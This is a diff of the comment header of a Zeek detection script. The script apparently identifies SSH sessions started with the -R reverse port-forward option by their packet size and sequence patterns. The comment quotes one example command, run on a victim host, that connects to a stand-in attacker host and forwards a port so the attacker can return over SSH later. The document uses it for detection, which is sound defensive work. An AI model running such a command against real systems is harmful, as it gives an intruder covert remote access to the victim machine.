@@ -2,12 +2,12 @@
 # __contact__ = 'benjeems@gmail.com @benreardon'
 # __version__ = '0.1'
 # __license__ = 'GNU General Public License v3.0'
-#
+#            packetSrider_R_option.zeek
 # zeek script looks for specific patterns in the size and 
-# sequence of packets that are unique to when the -R option 
-# is used by the initialization of the forward session.
-# An example of a forward command that would trigger this script
-# would be when this is run on the victim PC
+# sequence of packets that are unique to cases where the -R 
+# option is present in the commandline of the forward session.
+# An example of a forward commandline that would trigger 
+# this script # would be when this is run on the victim host :
 # `ssh attacker@attacker.com -R 31337:localhost:22`
 # This -R option is required to support a reverse SSH session 
 # from attacker back to the victim at a later stage.
